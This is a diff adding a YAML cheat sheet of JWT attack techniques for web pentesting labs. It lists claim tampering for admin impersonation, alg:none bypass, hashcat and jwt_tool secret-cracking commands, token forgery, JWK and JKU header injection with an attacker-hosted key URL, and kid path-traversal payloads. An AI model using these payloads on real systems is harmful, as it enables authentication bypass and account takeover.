@@ -1,0 +1,356 @@
+name: JSON Web Token (JWT) Attacks
+
+steps:
+  - title: Identify JWT Usage
+    mode: chain
+    info: |
+      Identify JWT-based authentication and session handling.
+
+    entries:
+      - cmd: "Authorization: Bearer <JWT>"
+        info: bearer authentication
+
+      - cmd: "session=<JWT>"
+        info: cookie-based JWT
+
+      - cmd: "eyJ..."
+        info: Base64 JWT signature
+
+      - cmd: "Header.Payload.Signature"
+        info: JWT structure
+
+    look_for:
+      - JWT cookies
+      - Bearer tokens
+      - Base64 segments
+      - alg header
+      - authentication claims
+
+    notes:
+      - JWTs commonly appear in cookies and Authorization headers
+      - decode before modifying
+
+  - title: JWT Inspection
+    mode: chain
+    info: |
+      Decode and inspect JWT headers and claims.
+
+    entries:
+      - cmd: "Decode JWT"
+        info: inspect header and payload
+
+      - cmd: "Inspect alg"
+        info: signing algorithm
+
+      - cmd: "Inspect kid"
+        info: key identifier
+
+      - cmd: "Inspect jwk"
+        info: embedded key
+
+      - cmd: "Inspect jku"
+        info: remote key URL
+
+      - cmd: "Inspect sub"
+        info: username claim
+
+      - cmd: "Inspect role/admin claims"
+        info: privilege indicators
+
+    look_for:
+      - HS256
+      - RS256
+      - kid
+      - jku
+      - jwk
+      - role fields
+      - admin flags
+      - user identifiers
+
+  - title: Claim Manipulation
+    mode: chain
+    info: |
+      Modify claims controlling identity and authorization.
+
+    entries:
+      - cmd: "\"sub\": \"administrator\""
+        info: username impersonation
+
+      - cmd: "\"role\": \"admin\""
+        info: role escalation
+
+      - cmd: "\"admin\": true"
+        info: boolean admin flag
+
+      - cmd: "\"permissions\": [\"admin\"]"
+        info: permission escalation
+
+      - cmd: "\"uid\": 1"
+        info: numeric privilege abuse
+
+      - cmd: "\"email\": \"admin@target.com\""
+        info: identity spoofing
+
+    look_for:
+      - admin panel access
+      - changed privileges
+      - successful impersonation
+      - elevated functionality
+
+    notes:
+      - most JWT attacks begin with claim manipulation
+      - test identity and role claims first
+
+  - title: Signature Verification Bypass
+    mode: chain
+    info: |
+      Test whether the server validates JWT signatures correctly.
+
+    entries:
+      - cmd: "Modify payload without resigning"
+        info: weak verification
+
+      - cmd: "Change sub claim"
+        info: impersonation attempt
+
+      - cmd: "Replay modified token"
+        info: signature validation test
+
+    look_for:
+      - accepted modified tokens
+      - admin access
+      - ignored signatures
+      - missing verification
+
+  - title: alg:none Bypass
+    mode: chain
+    info: |
+      Test whether unsigned JWTs are accepted.
+
+    entries:
+      - cmd: "\"alg\": \"none\""
+        info: unsigned JWT algorithm
+
+      - cmd: "Remove signature"
+        info: empty signature
+
+      - cmd: "Keep trailing dot"
+        info: valid JWT format
+
+      - cmd: "\"sub\": \"administrator\""
+        info: impersonation claim
+
+    look_for:
+      - accepted unsigned JWTs
+      - admin access
+      - ignored signatures
+      - authentication bypass
+
+    notes:
+      - some implementations trust alg:none
+      - signature section should be empty
+
+  - title: Weak Secret Brute Force
+    mode: chain
+    info: |
+      Brute-force weak HS256 secrets and forge valid tokens.
+
+    entries:
+      - cmd: "hashcat -a 0 -m 16500 <JWT> jwt.secrets.list"
+        info: JWT secret brute force
+
+      - cmd: "jwt_tool <JWT> -C -d jwt.secrets.list"
+        info: automated JWT cracking
+
+      - cmd: "secret"
+        info: common weak secret
+
+      - cmd: "secret1"
+        info: common lab secret
+
+      - cmd: "password"
+        info: weak signing key
+
+    look_for:
+      - cracked secrets
+      - reusable signing keys
+      - weak configurations
+
+    notes:
+      - common for HS256
+      - resign modified tokens after cracking secret
+
+  - title: Re-Signing Forged Tokens
+    mode: chain
+    info: |
+      Re-sign modified JWTs using recovered or attacker-controlled keys.
+
+    entries:
+      - cmd: "Sign modified JWT"
+        info: generate valid signature
+
+      - cmd: "\"sub\": \"administrator\""
+        info: impersonation claim
+
+      - cmd: "Use cracked secret"
+        info: valid signing key
+
+      - cmd: "Replay signed token"
+        info: authentication bypass
+
+    look_for:
+      - accepted forged JWTs
+      - admin access
+      - valid signatures
+      - privilege escalation
+
+  - title: Embedded JWK Injection
+    mode: chain
+    info: |
+      Test whether the server trusts attacker-supplied JWK headers.
+
+    entries:
+      - cmd: "\"jwk\": { ... }"
+        info: embedded public key
+
+      - cmd: "Generate RSA key pair"
+        info: attacker-controlled key
+
+      - cmd: "\"sub\": \"administrator\""
+        info: impersonation claim
+
+      - cmd: "Sign with attacker private key"
+        info: forged signature
+
+    look_for:
+      - trusted embedded keys
+      - accepted attacker signatures
+      - admin access
+      - insecure key trust
+
+    notes:
+      - common JWT header injection flaw
+      - embedded JWK must match signing key
+
+  - title: JKU Header Injection
+    mode: chain
+    info: |
+      Test whether the server fetches signing keys from attacker-controlled URLs.
+
+    entries:
+      - cmd: "\"jku\": \"http://<ATTACKER>/jwks.json\""
+        info: remote JWK set
+
+      - cmd: "\"kid\": \"<KEY_ID>\""
+        info: matching key identifier
+
+      - cmd: "Host malicious JWKS"
+        info: attacker-controlled keys
+
+      - cmd: "Sign JWT with matching private key"
+        info: valid forged signature
+
+    look_for:
+      - outbound key retrieval
+      - accepted attacker keys
+      - successful authentication
+      - admin access
+
+    notes:
+      - host malicious JWK set
+      - kid must match uploaded key
+
+  - title: kid Header Injection / Traversal
+    mode: chain
+    info: |
+      Test whether kid values are used insecurely for filesystem key loading.
+
+    entries:
+      - cmd: "\"kid\": \"../../../../../../../dev/null\""
+        info: path traversal
+
+      - cmd: "\"kid\": \"/dev/null\""
+        info: null device abuse
+
+      - cmd: "\"kid\": \"../../../../../../../etc/passwd\""
+        info: arbitrary file reference
+
+      - cmd: "Sign using null byte secret"
+        info: empty key abuse
+
+    look_for:
+      - path traversal
+      - local file access
+      - weak key loading
+      - accepted forged JWTs
+
+    notes:
+      - common in filesystem-based key loading
+      - test traversal sequences carefully
+
+  - title: Common JWT Claims
+    mode: enum
+    info: |
+      High-value claims commonly controlling authorization.
+
+    entries:
+      - cmd: "sub"
+        info: subject identifier
+
+      - cmd: "role"
+        info: user role
+
+      - cmd: "admin"
+        info: admin boolean
+
+      - cmd: "permissions"
+        info: permission list
+
+      - cmd: "uid"
+        info: user ID
+
+      - cmd: "iss"
+        info: issuer
+
+      - cmd: "aud"
+        info: audience
+
+      - cmd: "exp"
+        info: expiration
+
+      - cmd: "iat"
+        info: issued at
+
+      - cmd: "nbf"
+        info: not before
+
+    look_for:
+      - privilege indicators
+      - mutable claims
+      - identity fields
+      - trust assumptions
+
+  - title: Useful Tools
+    mode: enum
+    info: |
+      Useful JWT tooling and workflows.
+
+    entries:
+      - cmd: "Burp JWT Editor"
+        info: JWT manipulation
+
+      - cmd: "jwt_tool"
+        info: automated attacks
+
+      - cmd: "hashcat"
+        info: secret cracking
+
+      - cmd: "Burp Decoder"
+        info: Base64 decoding
+
+      - cmd: "jwt.io"
+        info: JWT inspection
+
+    notes:
+      - Burp JWT Editor is extremely useful for labs and CTFs
+      - automate brute forcing carefully
